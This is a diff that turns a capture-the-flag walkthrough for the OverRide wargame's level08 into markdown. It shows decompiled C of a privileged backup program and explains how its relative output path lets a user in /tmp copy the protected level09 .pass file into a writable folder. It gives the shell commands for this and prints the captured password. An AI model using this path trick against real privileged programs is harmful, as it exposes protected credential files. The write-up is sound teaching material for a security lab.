@@ -1,3 +1,17 @@
+# OverRide — Level08 Walkthrough
+
+## Binary Analysis
+
+The program behavior is:
+
+1. Open `./backups/.log` for writing.
+2. Open the source file provided as `argv[1]`.
+3. Build destination path as `./backups/` + `argv[1]`.
+4. Copy file content from source to destination.
+
+Decompiled code:
+
+```c
 void log_wrapper(FILE *file, char *str, char *name) {
     char buffer[0xff]; // 255
 
@@ -11,7 +25,7 @@ int main(int argc, char *argv[]) {
     char buffer[0x64]; // 100
     int8_t c = -1;
     int32_t dest = -1;
-    
+
     if (argc != 2) {
         printf("Usage: %s filename\n", *argv);
     }
@@ -38,10 +52,9 @@ int main(int argc, char *argv[]) {
         exit(1);
     }
 
-    do
-    {
+    do {
         write(dest, &c, 1);
-		c = fgetc(origin);
+        c = fgetc(origin);
     } while (c != 0xff);
 
     log_wrapper(log_file, "Finished back up ", argv[1]);
@@ -50,11 +63,38 @@ int main(int argc, char *argv[]) {
 
     return 0;
 }
+```
 
-firstly the program try to open "./backups/.log" if open failed it exit, then it try to open argv[1] if open failed it exit, then it try to open "./backups/argv[1]" if failed it exit and then it write the content of argv[1] file inside "./backups/argv[1]".
+## Vulnerability
 
-the program have the permission of level09 so it could read the .pass file. so because the program use relative path we can create inside /tmp our backups folder with inside the .log file and the absolute path to our pass.
+The binary runs with higher privileges and accepts an arbitrary input path from `argv[1]`.
 
+Because it uses relative destination paths (`./backups/...`), we can run it from a controlled directory (for example `/tmp`) and force it to copy protected files into our own writable backup tree.
+
+## Exploitation
+
+Create the required structure in `/tmp`:
+
+```bash
+level08@OverRide:/tmp$ mkdir -p backups/home/users/level09
+level08@OverRide:/tmp$ touch backups/.log
+```
+
+Run the privileged binary against the protected password file:
+
+```bash
 level08@OverRide:/tmp$ /home/users/level08/level08 /home/users/level09/.pass
-cat /tmp/backups/home/users/level09/.pass
+```
+
+Read the copied file from your controlled backup directory:
+
+```bash
+level08@OverRide:/tmp$ cat /tmp/backups/home/users/level09/.pass
 fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
+```
+
+## Result
+
+Successfully retrieved the next level password:
+
+`fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S`
